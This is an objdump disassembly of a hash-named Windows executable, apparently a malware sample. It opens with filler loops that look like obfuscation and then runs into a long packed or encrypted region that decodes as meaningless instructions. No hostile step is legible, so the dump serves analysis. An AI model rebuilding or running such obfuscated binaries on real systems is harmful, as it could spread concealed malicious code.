
ea5549a60c8bd01b1647eb08b5d06249444d06d693a45e851987a914f7740940.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc9e
  40100b:	movzx  ecx,BYTE PTR ds:0x42fd0d
  401012:	mov    DWORD PTR [ebp-0x20],eax
  401015:	mov    ecx,DWORD PTR [ebp-0x20]
  401018:	mov    DWORD PTR [ebp-0x24],0x4ec5
  40101f:	mov    DWORD PTR ds:0x42fd09,0x6cee
  401029:	cmp    ecx,eax
  40102b:	mov    DWORD PTR ds:0x42e11c,0x6120
  401035:	jne    0x402968
  40103b:	or     ecx,0x42d0
  401041:	mov    ax,WORD PTR [ebp-0x24]
  401045:	adc    DWORD PTR ds:0x42fcf1,edx
  40104b:	push   esi
  40104c:	and    DWORD PTR ds:0x42fcd9,0x0
  401056:	jmp    0x401068
  40105b:	mov    ecx,DWORD PTR ds:0x42fcd9
  401061:	inc    ecx
  401062:	mov    DWORD PTR ds:0x42fcd9,ecx
  401068:	cmp    DWORD PTR ds:0x42fcd9,0x1a
  40106f:	jae    0x4010b5
  401075:	cmp    DWORD PTR ds:0x42fcd9,0xf
  40107c:	jne    0x401090
  401082:	push   0x23a3
  401087:	push   DWORD PTR [ebp-0x10]
  40108a:	call   DWORD PTR ds:0x42e527
  401090:	cmp    DWORD PTR ds:0x42fcd9,0xe
  401097:	jne    0x4010aa
  40109d:	mov    ecx,DWORD PTR ds:0x42fcd9
  4010a3:	inc    ecx
  4010a4:	mov    DWORD PTR ds:0x42fcd9,ecx
  4010aa:	jmp    0x40105b
  4010af:	add    DWORD PTR ds:0x42e124,edx
  4010b5:	mov    ecx,0x8a3e
  4010ba:	xor    ax,cx
  4010bd:	sub    ecx,DWORD PTR ds:0x42e70b
  4010c3:	mov    ecx,DWORD PTR [ebp+0x8]
  4010c6:	mov    DWORD PTR ds:0x42e6fb,0x11
  4010d0:	cmp    DWORD PTR ds:0x42e6fb,0x0
  4010d7:	je     0x4011ef
  4010dd:	cmp    DWORD PTR ds:0x42e6fb,0x8
  4010e4:	jne    0x401100
  4010ea:	push   0x42e128
  4010ef:	push   DWORD PTR [ebp-0x10]
  4010f2:	push   0x671d
  4010f7:	push   DWORD PTR [ebp-0x20]
  4010fa:	call   DWORD PTR ds:0x42e2cf
  401100:	cmp    DWORD PTR ds:0x42e6fb,0x9
  401107:	jne    0x40111c
  40110d:	xor    esi,esi
  40110f:	xor    esi,DWORD PTR ds:0x42e6fb
  401115:	dec    esi
  401116:	mov    DWORD PTR ds:0x42e6fb,esi
  40111c:	mov    esi,DWORD PTR ds:0x42e6fb
  401122:	dec    esi
  401123:	mov    DWORD PTR ds:0x42e6fb,esi
  401129:	jmp    0x4010d0
  40112e:	and    DWORD PTR ds:0x42e11c,0x0
  401138:	mov    esi,DWORD PTR ds:0x42e11c
  40113e:	inc    esi
  40113f:	mov    DWORD PTR ds:0x42e11c,esi
  401145:	cmp    DWORD PTR ds:0x42e11c,0xd
  40114c:	jne    0x401160
  401152:	push   0x3999
  401157:	push   DWORD PTR [ebp-0x20]
  40115a:	call   DWORD PTR ds:0x42e52b
  401160:	cmp    DWORD PTR ds:0x42e11c,0xc
  401167:	jne    0x40117c
  40116d:	xor    esi,esi
  40116f:	add    esi,DWORD PTR ds:0x42e11c
  401175:	inc    esi
  401176:	mov    DWORD PTR ds:0x42e11c,esi
  40117c:	cmp    DWORD PTR ds:0x42e11c,0x15
  401183:	jb     0x401138
  401189:	mov    DWORD PTR ds:0x42e134,0x1a
  401193:	cmp    DWORD PTR ds:0x42e134,0x0
  40119a:	je     0x4011ef
  4011a0:	cmp    DWORD PTR ds:0x42e134,0x25
  4011a7:	jne    0x4011d5
  4011ad:	push   0x42fd7a
  4011b2:	push   DWORD PTR [ebp-0x20]
  4011b5:	push   0x4679
  4011ba:	push   0x42fd82
  4011bf:	push   0x17d1
  4011c4:	push   0x42e227
  4011c9:	push   DWORD PTR [ebp-0x14]
  4011cc:	push   DWORD PTR [ebp-0x18]
  4011cf:	call   DWORD PTR ds:0x42e44b
  4011d5:	xor    esi,esi
  4011d7:	or     esi,DWORD PTR ds:0x42e134
  4011dd:	dec    esi
  4011de:	mov    DWORD PTR ds:0x42e134,esi
  4011e4:	jmp    0x401193
  4011e9:	add    DWORD PTR ds:0x42e6fb,ecx
  4011ef:	push   edi
  4011f0:	xor    esi,esi
  4011f2:	or     esi,DWORD PTR ds:0x42fd05
  4011f8:	adc    esi,DWORD PTR ds:0x42fd09
  4011fe:	mov    DWORD PTR ds:0x42fd05,esi
  401204:	mov    edi,0x3b04
  401209:	add    ax,di
  40120c:	mov    DWORD PTR ds:0x42e703,0x17
  401216:	cmp    DWORD PTR ds:0x42e703,0x0
  40121d:	je     0x401257
  401223:	cmp    DWORD PTR ds:0x42e703,0x26
  40122a:	jne    0x401243
  401230:	push   DWORD PTR [ebp-0x10]
  401233:	push   0x42e1c6
  401238:	push   0x42e17d
  40123d:	call   DWORD PTR ds:0x42e52f
  401243:	xor    esi,esi
  401245:	or     esi,DWORD PTR ds:0x42e703
  40124b:	dec    esi
  40124c:	mov    DWORD PTR ds:0x42e703,esi
  401252:	jmp    0x401216
  401257:	movzx  eax,ax
  40125a:	not    eax
  40125c:	and    eax,DWORD PTR [ecx]
  40125e:	mov    ecx,DWORD PTR [ebp+0x8]
  401261:	mov    DWORD PTR ds:0x42fd7e,0x12
  40126b:	cmp    DWORD PTR ds:0x42fd7e,0x0
  401272:	je     0x4012b2
  401278:	cmp    DWORD PTR ds:0x42fd7e,0x22
  40127f:	jne    0x4012a0
  401285:	push   0x42e227
  40128a:	push   0x7fee
  40128f:	push   DWORD PTR [ebp-0x28]
  401292:	push   DWORD PTR [ebp-0x24]
  401295:	push   0x4b6b
  40129a:	call   DWORD PTR ds:0x42e533
  4012a0:	mov    esi,DWORD PTR ds:0x42fd7e
  4012a6:	dec    esi
  4012a7:	mov    DWORD PTR ds:0x42fd7e,esi
  4012ad:	jmp    0x40126b
  4012b2:	mov    DWORD PTR [ecx],eax
  4012b4:	mov    ecx,0x7510855
  4012b9:	mov    esi,0x32729c
  4012be:	push   ebx
  4012bf:	mov    ax,WORD PTR [ebp-0x24]
  4012c3:	movzx  eax,ax
  4012c6:	mov    DWORD PTR [ebp-0x38],eax
  4012c9:	mov    eax,DWORD PTR [ebp+0x8]
  4012cc:	mov    DWORD PTR [ebp-0x28],eax
  4012cf:	mov    DWORD PTR [ebp-0x8],0xf89c8530
  4012d6:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4012dd:	mov    eax,0x9577
  4012e2:	jmp    0x4014ff
  4012e7:	sbb    BYTE PTR [edx-0x68cdf8d6],0xb1
  4012ee:	cdq    
  4012ef:	js     0x401291
  4012f1:	mov    ah,0x66
  4012f3:	pop    edx
  4012f4:	outs   dx,DWORD PTR ds:[esi]
  4012f5:	std    
  4012f6:	sbb    al,0x70
  4012f8:	jo     0x40136a
  4012fa:	jo     0x40136c
  4012fc:	jle    0x40136e
  4012fe:	jo     0x4012c0
  401300:	xlat   BYTE PTR ds:[ebx]
  401301:	cmp    eax,0xcfd339d5
  401306:	rol    eax,1
  401308:	pop    es
  401309:	push   es
  40130a:	add    ecx,DWORD PTR [edi]
  40130c:	inc    ebx
  40130d:	add    cl,BYTE PTR [edi]
  40130f:	xor    ecx,DWORD PTR [edi]
  401311:	ret    0xc71a
  401314:	adc    bl,BYTE PTR [edi]
  401316:	mov    ecx,0xddb7025a
  40131b:	add    bh,ch
  40131d:	mov    ebp,0x8003c8db
  401322:	sbb    BYTE PTR [eax+0x1541a4f6],dh
  401328:	lods   eax,DWORD PTR ds:[esi]
  401329:	sar    BYTE PTR [eax+0x6fee581f],1
  40132f:	or     edx,DWORD PTR [ecx]
  401331:	sahf   
  401332:	jp     0x4012fc
  401334:	inc    edx
  401335:	lods   al,BYTE PTR ds:[esi]
  401336:	push   ebx
  401337:	sub    eax,0xad3ec6d1
  40133c:	mov    WORD PTR [ebx-0x3b],?
  40133f:	stos   DWORD PTR es:[edi],eax
  401340:	js     0x401308
  401342:	rol    DWORD PTR [ecx+0x3992c8f9],cl
  401348:	jmp    0x40137c
  40134a:	mov    ebp,ecx
  40134c:	dec    edi
  40134d:	fcomp  DWORD PTR [eax-0x656800bf]
  401353:	pop    es
  401354:	test   eax,0xed4dbddc
  401359:	sub    BYTE PTR [ebp+0x23],dl
  40135c:	mov    ah,0xec
  40135e:	pusha  
  40135f:	nop
  401360:	mov    esi,0x94c3117b
  401365:	and    esi,edx
  401367:	jmp    0x4013b9
  401369:	(bad)  
  40136a:	out    0xba,al
  40136c:	repnz in al,dx
  40136e:	xchg   esp,eax
  40136f:	xor    edi,ecx
  401371:	jbe    0x4013d8
  401373:	xlat   BYTE PTR ds:[ebx]
  401374:	and    cl,ch
  401376:	add    al,0xd9
  401378:	adc    DWORD PTR [ecx-0x68],edx
  40137b:	xor    eax,0x7a616f03
  401380:	or     dh,BYTE PTR [ecx]
  401382:	fld    QWORD PTR [eax+0x7f752a56]
  401388:	xor    BYTE PTR [edi+0xba8db0c],cl
  40138e:	pop    ebx
  40138f:	push   ebp
  401390:	(bad)  
  401392:	or     ebx,edx
  401394:	pop    esi
  401395:	fstp   DWORD PTR [ecx]
  401397:	jno    0x401329
  401399:	mov    eax,0x2b15374b
  40139e:	ja     0x4013c9
  4013a0:	sbb    al,0xd3
  4013a2:	xor    BYTE PTR [edi-0x16],cl
  4013a5:	into   
  4013a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4013a7:	enter  0xe76e,0x65
  4013ab:	mov    WORD PTR [eax-0x54cd1693],bx
  4013b2:	xor    ch,BYTE PTR [edx+0x2dee4d33]
  4013b8:	mov    edi,0x6bf8f66
  4013bd:	adc    eax,0xcab02b99
  4013c2:	xchg   ecx,eax
  4013c3:	mov    esp,0x7ffaf3bd
  4013c8:	adc    bl,BYTE PTR [edx+0x33]
  4013cb:	pop    ecx
  4013cc:	shl    ebp,0xeb
  4013cf:	mov    ds:0xecda716f,al
  4013d4:	cs mov edx,0x50cb8ca4
  4013da:	out    0x17,eax
  4013dc:	mov    DWORD PTR [edi+esi*8],esi
  4013df:	and    eax,DWORD PTR [esi-0x3e642671]
  4013e5:	lahf   
  4013e6:	jge    0x401427
  4013e8:	test   BYTE PTR [eax],al
  4013ea:	mov    ds:0xc3894d3d,al
  4013ef:	ins    BYTE PTR es:[edi],dx
  4013f0:	retf   0xf858
  4013f3:	sti    
  4013f4:	sub    al,0x90
  4013f6:	sub    DWORD PTR [ebp-0x35527d95],esi
  4013fc:	gs push ss
  4013fe:	icebp  
  4013ff:	mov    bl,0x7
  401401:	push   ds
  401402:	cmp    al,BYTE PTR [edx-0x30]
  401405:	jb     0x4013fa
  401407:	xor    ch,dh
  401409:	pop    ds
  40140a:	sbb    ebp,DWORD PTR [esi]
  40140c:	int    0xfe
  40140e:	sbb    BYTE PTR [eax],0x7b
  401411:	add    BYTE PTR [ebx+0x1fbdba4f],0xb5
  401418:	sbb    dh,dl
  40141a:	shufps xmm1,xmm5,0xd0
  40141e:	sbb    eax,0x5e00c9a3
  401423:	enter  0x3406,0x64
  401427:	sbb    ecx,DWORD PTR [eax-0x1f]
  40142a:	or     eax,0x61df735f
  40142f:	push   cs
  401430:	ret    
  401431:	lock rcr bl,1
  401434:	lahf   
  401435:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401436:	push   ds
  401437:	xchg   esp,eax
  401438:	les    edi,FWORD PTR [ebx-0x6d]
  40143b:	sahf   
  40143c:	and    DWORD PTR [esi+0x22e0073c],edx
  401442:	jo     0x401485
  401444:	add    al,0x29
  401446:	call   FWORD PTR [eax-0x18]
  401449:	test   DWORD PTR [edi],esi
  40144b:	mov    ebp,0x8268e8b
  401450:	jl     0x401485
  401452:	outs   dx,BYTE PTR ds:[esi]
  401453:	sbb    DWORD PTR [esi-0x700a40d6],0x7fee3a6c
  40145d:	dec    ebx
  40145e:	inc    esi
  40145f:	ins    DWORD PTR es:[edi],dx
  401460:	inc    esp
  401461:	adc    edi,esi
  401463:	ficomp WORD PTR [ecx-0x6079c405]
  401469:	xlat   BYTE PTR ds:[ebx]
  40146a:	mov    cl,0xd2
  40146c:	nop
  40146d:	or     al,0xa
  40146f:	repnz cmp BYTE PTR [ebx+edx*4+0x61],0xdd
  401475:	fs mov bh,0xdd
  401479:	mov    edx,0x211ef8b7
  40147e:	jno    0x40149e
  401480:	cli    
  401481:	add    al,0xa8
  401483:	fist   DWORD PTR [bp+di+0x27]
  401487:	(bad)  [edx-0x4febf19d]
  40148d:	call   0xcd82:0xdb81e22e
  401494:	mov    esp,0x9b428424
  401499:	lods   eax,DWORD PTR ds:[esi]
  40149a:	stos   DWORD PTR es:[edi],eax
  40149b:	adc    cl,BYTE PTR [ecx]
  40149d:	mov    ebx,0x116ea848
  4014a2:	sub    BYTE PTR [esi+0x39e88b08],dl
  4014a8:	pop    DWORD PTR [edx+0x69]
  4014ab:	adc    ebp,DWORD PTR [edi-0x415f9b3a]
  4014b1:	ret    
  4014b2:	jp     0x401505
  4014b4:	dec    ecx
  4014b5:	xchg   ebp,eax
  4014b6:	cli    
  4014b7:	or     eax,0xe00ac34f
  4014bc:	mov    DWORD PTR [ecx-0x75119c89],esi
  4014c2:	in     al,dx
  4014c3:	cld    
  4014c4:	stos   DWORD PTR es:[edi],eax
  4014c5:	or     BYTE PTR [edi-0x3fa21e2c],dl
  4014cb:	shr    BYTE PTR [edi],1
  4014cd:	ret    
  4014ce:	cmp    dh,BYTE PTR [edi+edx*4]
  4014d1:	lock frstor [esi+esi*1+0x2b19a054]
  4014d9:	cli    
  4014da:	aam    0xb3
  4014dc:	lea    ebp,ds:0xfcfc4571
  4014e2:	test   eax,0x9c44c87d
  4014e7:	jp     0x4014af
  4014e9:	cmp    esp,DWORD PTR [eax-0x7b]
  4014ec:	mov    bh,0x4e
  4014ee:	lock lods al,BYTE PTR ds:[esi]
  4014f0:	push   0x2d
  4014f2:	mov    ebx,0x8719ad20
  4014f7:	sub    al,0xa1
  4014fa:	repnz sbb eax,0x66c11bdc
  401500:	mov    DWORD PTR [ebp-0x4],eax
  401503:	jmp    0x401720
  401508:	clc    
  401509:	icebp  
  40150a:	mov    esp,0xb8b16984
  40150f:	icebp  
  401510:	ficomp DWORD PTR [edx-0x1613e013]
  401516:	mov    ds:0x707e707b,al
  40151b:	jo     0x40158d
  40151d:	jle    0x40158f
  40151f:	jo     0x40150c
  401521:	lods   al,BYTE PTR ds:[esi]
  401522:	das    
  401523:	jl     0x40155c
  401525:	adc    bh,BYTE PTR [ecx]
  401527:	jge    0x4014de
  401529:	dec    eax
  40152a:	in     al,dx
  40152b:	jo     0x401575
  40152d:	add    BYTE PTR [eax+0x10],0x8b
  401531:	jb     0x401581
  401533:	jb     0x401557
  401535:	push   0x4fc95f79
  40153a:	jae    0x4015ad
  40153c:	bnd jp 0x40158f
  40153f:	icebp  
  401540:	aam    0xc9
  401542:	loope  0x40155d
  401544:	fnstenv [ecx]
  401546:	cmc    
  401547:	xchg   ecx,eax
  401548:	popf   
  401549:	arpl   di,ax
  40154b:	mov    eax,0xa6fb64a2
  401550:	mov    bl,0x47
  401552:	pop    eax
  401553:	das    
  401554:	push   cs
  401555:	fimul  DWORD PTR [ebx]
  401557:	add    eax,0xd5fdb37e
  40155c:	jnp    0x4015ca
  40155e:	pop    edx
  40155f:	pop    ds
  401560:	cli    
  401561:	test   al,0x17
  401563:	test   DWORD PTR [ebx+0x68b78e66],0x504e2a2
  40156d:	imul   ebp,DWORD PTR [eax+0x3aaa0188],0x8e8b53fd
  401577:	std    
  401578:	popa   
  401579:	scas   al,BYTE PTR es:[edi]
  40157a:	out    0x18,eax
  40157c:	leave  
  40157d:	and    esp,DWORD PTR [edx]
  40157f:	mov    esp,0x9cde8cd1
  401584:	fstp   TBYTE PTR [edx]
  401586:	and    eax,0xd96abf69
  40158b:	jle    0x4015bf
  40158d:	push   ecx
  40158e:	rcr    DWORD PTR [edx-0x67],cl
  401591:	dec    edx
  401592:	jge    0x4015bc
  401594:	addr16 inc ebp
  401596:	xor    al,0xda
  401598:	push   ebx
  401599:	adc    ah,BYTE PTR [ecx+ebp*1+0x15ac6ce]
  4015a0:	(bad)  
  4015a1:	pop    edi
  4015a2:	jbe    0x4015c6
  4015a4:	jbe    0x401576
  4015a6:	xchg   ebp,eax
  4015a7:	das    
  4015a8:	and    al,BYTE PTR [edx+0x4]
  4015ab:	pop    ebp
  4015ac:	push   eax
  4015ad:	jmp    0x40161d
  4015af:	mov    bh,0x56
  4015b1:	xor    edi,DWORD PTR [ebx]
  4015b3:	(bad)
  4015b6:	lock fcom QWORD PTR [ebp+0xe]
  4015ba:	adc    eax,0x59e3c416
  4015bf:	les    ebx,FWORD PTR [edi-0x3f74ac48]
  4015c5:	fmul   QWORD PTR [edx-0x15]
  4015c8:	(bad)  [esp+ebx*4]
  4015cb:	lods   al,BYTE PTR ds:[esi]
  4015cc:	xor    edx,DWORD PTR [ebp-0x63c85220]
  4015d2:	sub    eax,0xd5e0e2b8
  4015d7:	fcmovb st,st(5)
  4015d9:	add    BYTE PTR [edi-0x49],dl
  4015dc:	lock fstp QWORD PTR ds:0x731a6166
  4015e3:	sbb    al,0x54
  4015e5:	adc    ebx,edx
  4015e7:	inc    esi
  4015e8:	nop
  4015e9:	cmp    edi,DWORD PTR [esi+esi*2+0x1648ddcc]
  4015f0:	(bad)  
  4015f1:	shl    ch,1
  4015f3:	dec    esp
  4015f4:	bnd jne 0x40165a
  4015f7:	pushw  ss
  4015f9:	cmp    al,0xf0
  4015fb:	xor    eax,0xa1525af2
  401600:	pusha  
  401601:	sbb    DWORD PTR [esi],esi
  401603:	ja     0x4015d2
  401605:	mov    ch,0x83
  401607:	jg     0x401641
  401609:	and    al,0xc4
  40160b:	cmp    DWORD PTR [esi-0x31],edi
  40160e:	(bad)  
  40160f:	mov    ?,WORD PTR [ecx+edx*4]
  401612:	push   ss
  401613:	mov    al,0x94
  401615:	fdivr  st(4),st
  401617:	jns    0x4015f0
  401619:	(bad)
  40161c:	loopne 0x4015e2
  40161e:	sub    al,0xfb
  401620:	fldcw  WORD PTR [edi+0x5a4777f4]
  401626:	sub    BYTE PTR [eax+0x66],dl
  401629:	add    al,0xc9
  40162b:	adc    edi,DWORD PTR ds:0x7d448531
  401631:	(bad)
  401635:	adc    DWORD PTR [eax+eax*1+0x5e483a70],ebx
  40163c:	outs   dx,BYTE PTR ds:[esi]
  40163d:	sbb    DWORD PTR [esi+0x1b],ecx
  401640:	jno    0x4016b4
  401642:	cs mov dl,0x32
  401645:	xchg   ebx,eax
  401646:	out    dx,al
  401647:	sub    DWORD PTR [esi],ebx
  401649:	inc    edx
  40164a:	pop    edi
  40164b:	sub    eax,0x827f775e
  401650:	pop    ds
  401651:	push   0x5fe39f2b
  401656:	sbb    al,0xd3
  401658:	loopne 0x401625
  40165a:	lds    ebp,FWORD PTR [eax+eax*8+0x3a]
  40165e:	push   0x27998dca
  401663:	in     eax,dx
  401664:	std    
  401665:	push   ebx
  401666:	jmp    0x28bcd7e4
  40166b:	inc    edx
  40166c:	or     ebx,DWORD PTR [esi]
  40166e:	mov    DWORD PTR [eiz*4-0x34ad61d7],esp
  401675:	mov    al,0xf1
  401677:	pusha  
  401678:	adc    ebp,esi
  40167a:	adc    al,0x6a
  40167c:	test   DWORD PTR [ecx+0x74],0x209068a2
  401683:	sbb    dl,BYTE PTR [eax+0x45]
  401686:	mov    ebp,0x21348e97
  40168b:	loop   0x4016bf
  40168d:	scas   eax,DWORD PTR es:[edi]
  40168e:	les    edx,FWORD PTR [eax-0x20]
  401691:	shr    edi,1
  401693:	sti    
  401694:	add    BYTE PTR [edx+edx*1-0x6f6d4d86],dh
  40169b:	lea    edi,[edi-0x6c]
  40169e:	loope  0x4016fa
  4016a0:	in     eax,dx
  4016a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016a2:	enter  0xf91a,0xef
  4016a6:	xchg   ebx,eax
  4016a7:	pushw  ss
  4016a9:	jg     0x4016f2
  4016ab:	mov    dh,0x80
  4016ad:	mov    dl,0x8f
  4016af:	lock in al,0xc
  4016b2:	mov    bl,BYTE PTR [eax+0x26]
  4016b5:	sahf   
  4016b6:	mov    ch,0xf3
  4016b8:	jg     0x40166b
  4016ba:	and    ch,bl
  4016bc:	xor    al,0xd2
  4016be:	out    0xa2,eax
  4016c0:	call   ebx
  4016c2:	lahf   
  4016c3:	push   ds
  4016c4:	mov    ecx,0x61866764
  4016c9:	inc    edx
  4016ca:	lods   al,BYTE PTR ds:[esi]
  4016cb:	arpl   bp,cx
  4016cd:	push   edi
  4016ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016cf:	arpl   WORD PTR ds:0x431ed766,si
  4016d5:	daa    
  4016d6:	in     eax,dx
  4016d7:	out    dx,eax
  4016d8:	or     BYTE PTR [ebp-0x6f0a5190],0xd0
  4016df:	loop   0x401756
  4016e1:	ret    
  4016e2:	mov    WORD PTR fs:[esi+0x56c94e91],fs
  4016e9:	inc    edx
  4016ea:	setbe  BYTE PTR [edi]
  4016ed:	mov    eax,0xcf2c0b7a
  4016f2:	pop    ebp
  4016f3:	push   cs
  4016f4:	je     0x401706
  4016f6:	jbe    0x40173d
  4016f8:	mov    ebx,0x275bc966
  4016fd:	bound  esi,QWORD PTR [esi]
  4016ff:	push   esi
  401700:	ret    
  401701:	mov    esi,0x2d57ac2b
  401706:	std    
  401707:	cmp    ebx,eax
  401709:	shl    DWORD PTR [ebx+0x59],cl
  40170c:	jl     0x40174c
  40170e:	add    BYTE PTR [edi],0xe2
  401711:	jnp    0x4016e4
  401713:	out    0xa,al
  401715:	or     DWORD PTR [edx+0x5f],edi
  401718:	(bad)  
  401719:	mov    bl,0x7
  40171b:	clc    
  40171c:	out    dx,al
  40171d:	pushf  
  40171e:	mov    ch,0x63
  401720:	lea    eax,[ebp-0x30]
  401723:	mov    DWORD PTR [ebp-0x34],eax
  401726:	mov    eax,DWORD PTR [ebp-0x28]
  401729:	mov    DWORD PTR [ebp-0x2c],eax
  40172c:	lea    eax,[ebp-0x18]
  40172f:	jmp    0x40194c
  401734:	dec    ebp
  401735:	iret   
  401736:	lods   eax,DWORD PTR ds:[esi]
  401737:	dec    ebx
  401738:	lods   eax,DWORD PTR ds:[esi]
  401739:	imul   ebp,DWORD PTR [ecx-0x37],0x8e1037e1
  401740:	xor    BYTE PTR [ebp+0x7c7074f8],al
  401746:	jo     0x4017b8
  401748:	jo     0x4017c8
  40174a:	jo     0x4017bc
  40174c:	sbb    al,BYTE PTR [edi-0x21]
  40174f:	mov    ch,0x34
  401751:	lods   eax,DWORD PTR ds:[esi]
  401752:	arpl   WORD PTR [edi],di
  401754:	jp     0x401761
  401756:	in     eax,0xc5
  401758:	mov    eax,ds:0xedf1ec5c
  40175d:	lahf   
  40175e:	in     eax,dx
  40175f:	in     al,0x88
  401761:	xchg   edx,eax
  401762:	dec    eax
  401763:	fist   DWORD PTR [eax-0x20]
  401766:	push   es
  401767:	je     0x4017d1
  401769:	pop    edx
  40176a:	ret    0x230f
  40176d:	sub    BYTE PTR [esi],bh
  40176f:	jl     0x40173a
  401771:	xchg   ebp,eax
  401772:	jns    0x401738
  401774:	sub    al,0xf8
  401776:	pop    edx
  401777:	cs pop esi
  401779:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40177a:	dec    edx
  40177b:	test   DWORD PTR [edx+0xe1ba2b9],0x97b8de62
  401785:	ins    BYTE PTR es:[edi],dx
  401786:	jnp    0x4017ab
  401788:	icebp  
  401789:	or     al,0x44
  40178b:	(bad)  [eax+0x4f9d4e78]
  401791:	outs   dx,DWORD PTR ds:[esi]
  401792:	in     eax,0x71
  401794:	dec    DWORD PTR [ebx+0x6154dd41]
  40179a:	lea    esi,[eax-0x546987b5]
  4017a0:	mov    esi,0x2ecabae0
  4017a5:	xor    al,0xc6
  4017a7:	push   ebx
  4017a8:	mov    ds:0x12849ede,al
  4017ad:	test   edi,0x3d036986
  4017b3:	mov    ecx,DWORD PTR ss:[edx+edx*8]
  4017b7:	inc    eax
  4017b8:	stos   BYTE PTR es:[edi],al
  4017b9:	pop    ss
  4017ba:	(bad)  
  4017bc:	jno    0x4017c4
  4017be:	bound  eax,QWORD PTR [edi-0x1bc0fdfa]
  4017c4:	rol    BYTE PTR ds:0x18b0fdaf,0xb6
  4017cb:	dec    edx
  4017cc:	cld    
  4017cd:	lea    ecx,[eax+0x7863e166]
  4017d3:	or     BYTE PTR [edi],dl
  4017d5:	add    al,0xa5
  4017d7:	push   ss
  4017d8:	(bad)  [edi]
  4017da:	ins    BYTE PTR es:[edi],dx
  4017db:	aas    
  4017dc:	fst    DWORD PTR [eax-0x52f04a11]
  4017e2:	cs sub eax,0x332c72a0
  4017e8:	inc    ebx
  4017e9:	push   edx
  4017ea:	cmp    ch,ch
  4017ec:	xchg   ebp,eax
  4017ed:	sub    eax,0x4b0a16e1
  4017f2:	mov    WORD PTR [esi+0x13a4ec7],cs
  4017f8:	add    BYTE PTR [ebx+0x3b4dad43],0xf2
  4017ff:	push   ebp
  401800:	xchg   esp,eax
  401801:	lea    edx,[eax]
  401803:	test   eax,0x787907ad
  401808:	fistp  WORD PTR [edx+0x6d2dcd72]
  40180e:	int    0xfa
  401810:	and    eax,0xb99fe5e3
  401815:	ds add edi,edi
  401818:	mov    ecx,0x42380c82
  40181d:	adc    BYTE PTR [ebp+edi*2-0x48],bl
  401821:	mov    bl,0x6
  401823:	xlat   BYTE PTR ds:[ebx]
  401824:	mov    ebp,0x646368e3
  401829:	push   ebp
  40182a:	data16 jge 0x401856
  40182d:	nop
  40182e:	and    ecx,DWORD PTR [eax+eiz*4+0x1fbf537a]
  401835:	arpl   WORD PTR [edx],ax
  401837:	int    0x1e
  401839:	in     al,0xe1
  40183b:	dec    esp
  40183c:	xchg   DWORD PTR [edx],esp
  40183e:	loop   0x401859
  401840:	imul   esi,DWORD PTR [edx+0x64],0xffffff84
  401844:	aam    0x1a
  401846:	aas    
  401847:	jb     0x40188e
  401849:	cmp    dx,cx
  40184c:	mov    al,ds:0xddad5f20
  401851:	retf   
  401852:	iret   
  401853:	rcl    BYTE PTR [edi],0x80
  401856:	scas   eax,DWORD PTR es:[edi]
  401857:	sbb    al,0xd5
  401859:	or     edi,DWORD PTR [eax-0x5f]
  40185c:	add    ecx,edi
  40185e:	sub    eax,0x973904eb
  401863:	cmp    bh,dh
  401865:	mov    cl,0x6e
  401867:	jnp    0x401806
  401869:	jbe    0x401853
  40186b:	js     0x401858
  40186d:	jb     0x4018cf
  40186f:	sar    BYTE PTR [esi-0x44],0xa8
  401873:	std    
  401874:	jnp    0x401855
  401876:	nop
  401877:	enter  0x3e4f,0x73
  40187b:	(bad)  
  40187c:	int    0x51
  40187e:	xchg   edi,eax
  40187f:	ss aad 0x55
  401882:	repnz shl DWORD PTR ds:0x2d7aa481,0x3f
  40188a:	xchg   edi,eax
  40188b:	jmp    0x4018f8
  40188d:	xchg   ebx,eax
  40188e:	imul   ebp,DWORD PTR [ebp+ebp*4+0x29eee99b],0xffffffe9
  401896:	mov    edi,0x70332e87
  40189b:	popf   
  40189c:	test   eax,0xc1516977
  4018a1:	ss out 0xb2,al
  4018a4:	or     eax,0x4e33ef01
  4018a9:	mov    dh,0x13
  4018ab:	sub    ebx,DWORD PTR [eax-0x2a]
  4018ae:	hlt    
  4018af:	xchg   BYTE PTR [edx+0x42],ah
  4018b2:	iret   
  4018b3:	hlt    
  4018b4:	lock clc 
  4018b6:	and    DWORD PTR [ebp-0x20a68b0b],esi
  4018bc:	pop    edx
  4018bd:	mov    BYTE PTR [edi+edi*8],ah
  4018c0:	pop    ecx
  4018c1:	pop    eax
  4018c2:	clc    
  4018c3:	ins    BYTE PTR es:[edi],dx
  4018c4:	out    0x5a,al
  4018c6:	int    0x7b
  4018c8:	retf   
  4018c9:	aam    0x93
  4018cb:	ror    BYTE PTR [edi],0xcc
  4018ce:	mov    WORD PTR ss:[edx],es
  4018d1:	cmp    DWORD PTR [edi+0x4052a7a],ebx
  4018d7:	int    0x82
  4018d9:	sti    
  4018da:	jmp    0x5d58f121
  4018df:	mov    esp,0x27b975c9
  4018e4:	test   al,0x79
  4018e6:	int    0xbb
  4018e8:	aam    0x1f
  4018ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4018eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4018ec:	pop    edx
  4018ed:	cmp    ebp,ebx
  4018ef:	or     edx,edx
  4018f1:	xor    DWORD PTR [ebx-0x77d9f1cd],ebp
  4018f7:	fisub  WORD PTR [eax+0x4125b614]
  4018fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4018fe:	pop    ebp
  4018ff:	idiv   ah
  401901:	fs aad 0x41
  401904:	pop    ss
  401905:	nop
  401906:	mov    ds:0x661d7d30,eax
  40190b:	jmp    0x1451:0x2737681a
  401912:	ja     0x4018c0
  401914:	push   ecx
  401915:	sar    ch,0x88
  401918:	adc    cl,BYTE PTR [eax+0x6e]
  40191b:	pop    edi
  40191c:	fisubr DWORD PTR ds:0x9d70c9a
  401922:	inc    ebp
  401923:	jge    0x401980
  401925:	mov    ch,BYTE PTR [edi+0x6fed3071]
  40192b:	(bad)  
  40192c:	push   edi
  40192d:	mov    al,0x2b
  40192f:	mov    DWORD PTR [esi],edi
  401931:	shl    BYTE PTR [ebp-0x180c4e15],0x56
  401938:	jo     0x40197a
  40193a:	sahf   
